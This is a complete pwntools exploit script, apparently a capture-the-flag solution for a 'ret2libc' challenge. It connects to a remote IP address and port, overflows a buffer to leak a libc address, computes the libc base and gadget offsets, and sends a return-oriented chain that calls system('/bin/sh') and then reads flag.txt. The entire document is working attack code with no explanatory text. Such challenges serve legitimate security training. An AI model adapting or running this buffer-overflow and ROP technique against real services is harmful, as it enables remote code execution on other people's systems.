#!/usr/bin/python
from pwn import *
#r = process('./ret2libc')
r = remote('140.113.24.241', 30173)
r.recvline()
payload = b'A'*0x88 + p64(0x4010d0) + p64(0x4011f6)
r.send(payload)
stdout = r.recvuntil(b'\n', drop=True)
stdout += b'\x00'*(8-len(stdout))
libc_base = u64(stdout) - 0x21b780
poprdi = libc_base + 0x2a3e5
system = libc_base + 0x50d70
binsh = libc_base + 0x1d8678
exit = libc_base + 0x455f0
ret = libc_base + 0x29139
payload = b'A'*0x88 + p64(ret) + p64(ret) + p64(poprdi) + p64(binsh) + p64(system) + p64(exit)
r.send(payload)
sleep(1)
r.send(b'cat flag.txt\n')
flag  = r.recv().decode()
flag_index = flag.find('}')
print(flag[:flag_index + 1])
r.close()
